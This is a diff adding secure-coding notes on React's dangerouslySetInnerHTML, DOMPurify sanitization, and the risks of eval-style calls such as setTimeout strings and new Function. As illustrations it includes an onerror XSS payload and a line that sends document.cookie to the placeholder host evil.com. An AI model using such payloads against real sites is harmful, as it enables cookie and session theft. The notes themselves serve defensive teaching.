@@ -56,3 +56,36 @@ http://example.com/?msg=<script>alert('Hacked!')</script>
 
 4. cryptography for request body hasing.
 
+## dangerouslySetInnerHTML
+**dangerouslySetInnerHTML** is a special React prop that allows you to insert raw HTML directly into the DOM.
+
+```js
+<div dangerouslySetInnerHTML={{ __html: userContent }} />
+
+// if user content is below with some scripting :  then XSS happens
+<img src=x onerror=alert(1)>
+```
+so use DomPurify 
+```js
+import DOMPurify from "dompurify";
+
+const safeHTML = DOMPurify.sanitize(userContent);
+
+<div dangerouslySetInnerHTML={{ __html: safeHTML }} />
+
+```
+Never use below : 
+
+```js
+//Because when you pass a string, JavaScript treats it as code, not data.
+setTimeout("alert('Hacked')", 1000);
+//Internally, JS does something like:
+eval("alert('Hacked')");
+// new Function() is equivalent to eval() and should almost never be used.
+const fn = new Function("a", "b", "return a + b");
+fn(2, 3); // 5
+
+// Now think of 
+new Function(userInput)();
+userInput = "fetch('https://evil.com?c='+document.cookie)";
+```
